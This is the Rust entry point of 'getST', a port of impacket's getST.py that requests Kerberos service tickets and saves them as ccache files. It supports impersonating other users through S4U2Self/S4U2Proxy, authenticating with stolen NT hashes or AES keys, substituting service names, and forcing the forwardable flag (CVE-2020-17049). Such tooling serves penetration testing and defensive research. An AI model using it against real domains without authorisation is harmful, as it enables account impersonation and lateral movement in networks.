#![allow(non_snake_case)]
mod asn1;
mod crypto;
mod krb5;
mod ccache;
mod network;

use anyhow::{anyhow, bail, Result};
use std::io::Write;

struct Args {
    identity: String,
    spn: Option<String>,
    impersonate: Option<String>,
    hashes: Option<String>,
    aes_key: Option<String>,
    no_pass: bool,
    dc_ip: Option<String>,
    additional_ticket: Option<String>,
    altservice: Option<String>,
    self_only: bool,
    force_forwardable: bool,
    u2u: bool,
    renew: bool,
    output: Option<String>,
    debug: bool,
}

fn print_banner() {
    println!("  getST — Rust  | Inspired by impacket getST.py\n");
}


fn print_help() {
    eprintln!();
    eprintln!("usage: getST.exe [-h] -spn SPN [-impersonate IMPERSONATE] [-dc-ip ip address]");
    eprintln!("                 [-hashes LMHASH:NTHASH] [-aesKey hex key] [-additional-ticket ticket.ccache]");
    eprintln!("                 [-debug] [-self] [-altservice service] [-u2u] [-no-pass] [-k]");
    eprintln!("                 [-force-forwardable] identity");
    eprintln!();
    eprintln!("positional arguments:");
    eprintln!("  identity            [domain/]username[:password]");
    eprintln!();
    eprintln!("options:");
    eprintln!("  -h, -help           show this help message and exit");
    eprintln!("  -spn SPN            SPN (service/host)");
    eprintln!("  -impersonate user   user to impersonate (S4U2Self/S4U2Proxy)");
    eprintln!("  -dc-ip ip           KDC IP address");
    eprintln!("  -hashes LMHASH:NTHASH");
    eprintln!("  -aesKey hex         AES key in hex (32 or 64 chars)");
    eprintln!("  -additional-ticket file.ccache");
    eprintln!("                      S4U2Proxy additional ticket");
    eprintln!("  -altservice service  substitute service name in final ticket");
    eprintln!("  -self               only S4U2Self, no S4U2Proxy");
    eprintln!("  -force-forwardable  force forwardable flag (CVE-2020-17049)");
    eprintln!("  -u2u                User-to-User authentication");
    eprintln!("  -renew              renew TGT");
    eprintln!("  -no-pass            don't ask for password");
    eprintln!("  -debug              enable debug output");
    eprintln!("  -o file             output ccache file");
}

fn parse_args() -> Result<Args> {
    let argv: Vec<String> = std::env::args().collect();
    let mut args = Args {
        identity: String::new(), spn: None, impersonate: None,
        hashes: None, aes_key: None, no_pass: false, dc_ip: None,
        additional_ticket: None, altservice: None, self_only: false,
        force_forwardable: false, u2u: false, renew: false,
        output: None, debug: false,
    };
    let mut i = 1;
    while i < argv.len() {
        let a = &argv[i];
        match a.as_str() {
            "-h" | "-help" | "--help" => { print_help(); std::process::exit(0); }
            "-spn"                => { i += 1; args.spn = Some(argv.get(i).ok_or(anyhow!("-spn needs value"))?.clone()); }
            "-impersonate"        => { i += 1; args.impersonate = Some(argv.get(i).ok_or(anyhow!("-impersonate needs value"))?.clone()); }
            "-dc-ip"              => { i += 1; args.dc_ip = Some(argv.get(i).ok_or(anyhow!("-dc-ip needs value"))?.clone()); }
            "-hashes"             => { i += 1; args.hashes = Some(argv.get(i).ok_or(anyhow!("-hashes needs value"))?.clone()); }
            "-aesKey"             => { i += 1; args.aes_key = Some(argv.get(i).ok_or(anyhow!("-aesKey needs value"))?.clone()); }
            "-additional-ticket"  => { i += 1; args.additional_ticket = Some(argv.get(i).ok_or(anyhow!("-additional-ticket needs value"))?.clone()); }
            "-altservice"         => { i += 1; args.altservice = Some(argv.get(i).ok_or(anyhow!("-altservice needs value"))?.clone()); }
            "-o"                  => { i += 1; args.output = Some(argv.get(i).ok_or(anyhow!("-o needs value"))?.clone()); }
            "-self"               => { args.self_only = true; }
            "-force-forwardable"  => { args.force_forwardable = true; }
            "-u2u"                => { args.u2u = true; }
            "-renew"              => { args.renew = true; }
            "-no-pass" | "-k"     => { args.no_pass = true; }
            "-debug"              => { args.debug = true; }
            _ if !a.starts_with('-') => { args.identity = a.clone(); }
            _ => { bail!("Unknown option: {}", a); }
        }
        i += 1;
    }
    if args.identity.is_empty() { print_help(); std::process::exit(1); }
    Ok(args)
}

fn parse_target(s: &str) -> (String, String, String) {
    let (domain, up) = if let Some(i) = s.find('/') {
        (s[..i].to_lowercase(), &s[i+1..])
    } else {
        (String::new(), s)
    };
    let (user, pass) = if let Some(i) = up.find(':') {
        (up[..i].to_string(), up[i+1..].to_string())
    } else {
        (up.to_string(), String::new())
    };
    (domain, user, pass)
}

fn resolve_dc(domain: &str, arg: Option<&str>) -> Result<String> {
    if let Some(a) = arg { return Ok(a.to_string()); }
    use std::net::ToSocketAddrs;
    if let Ok(mut addrs) = (domain, 88u16).to_socket_addrs() {
        if let Some(addr) = addrs.next() {
            return Ok(addr.ip().to_string());
        }
    }
    Ok(domain.to_string())
}

fn main() -> Result<()> {

    print_banner();
    let args = parse_args()?;
    let (domain, username, mut password) = parse_target(&args.identity);
    if username.is_empty() { bail!("Username required: domain/user[:pass]"); }
    if domain.is_empty() { bail!("Domain required: domain/user[:pass]"); }

    unsafe { DEBUG = args.debug; }

    let nt_hash: Vec<u8> = if let Some(ref h) = args.hashes {
        let p: Vec<&str> = h.splitn(2, ':').collect();
        hex::decode(if p.len() == 2 { p[1] } else { p[0] }.trim())
            .map_err(|e| anyhow!("Bad hash: {}", e))?
    } else { vec![] };

    let aes_key: Vec<u8> = if let Some(ref k) = args.aes_key {
        let k = k.trim();
        if k.len() != 32 && k.len() != 64 { bail!("AES key must be 32 or 64 hex chars"); }
        hex::decode(k).map_err(|e| anyhow!("Bad AES key: {}", e))?
    } else { vec![] };

    if password.is_empty() && nt_hash.is_empty() && aes_key.is_empty() && !args.no_pass {
        eprint!("Password for {}\\{}: ", domain, username);
        std::io::stderr().flush()?;
        let mut p = String::new();
        std::io::stdin().read_line(&mut p)?;
        password = p.trim_end_matches(&['\r', '\n'][..]).to_string();
    }

    if !args.self_only && args.spn.is_none() && !args.renew {
        bail!("-spn required (or -self / -renew)");
    }
    if args.self_only && args.impersonate.is_none() {
        bail!("-impersonate required with -self");
    }

    let dc = resolve_dc(&domain, args.dc_ip.as_deref())?;
    let spn = args.spn.clone().unwrap_or_default();

    let auth = krb5::AuthInfo {
        domain: domain.clone(), username: username.clone(),
        password, nt_hash, aes_key,
    };

    let ticket = krb5::get_service_ticket(
        &dc, &auth, &spn,
        args.impersonate.as_deref(), args.additional_ticket.as_deref(),
        args.altservice.as_deref(), args.self_only, args.force_forwardable,
        args.u2u, args.renew,
    )?;

    let out = args.output.unwrap_or_else(|| {
        let base = args.impersonate.clone().unwrap_or_else(|| username.clone());
        let eff = args.altservice.clone().unwrap_or_else(|| spn.clone());
        if eff.is_empty() { format!("{}.ccache", base) }
        else { format!("{}@{}.ccache", base, eff.replace('/', "_")) }
    });

    let ccache_realm = domain.to_uppercase();
    let ccache_client = args.impersonate.as_deref().unwrap_or(&username);
    ccache::write_ccache(&out, &ticket, &ccache_realm, ccache_client)?;
    eprintln!("[*] Saving ticket in {}", out);
    Ok(())
}

static mut DEBUG: bool = false;
pub fn is_debug() -> bool { unsafe { DEBUG } }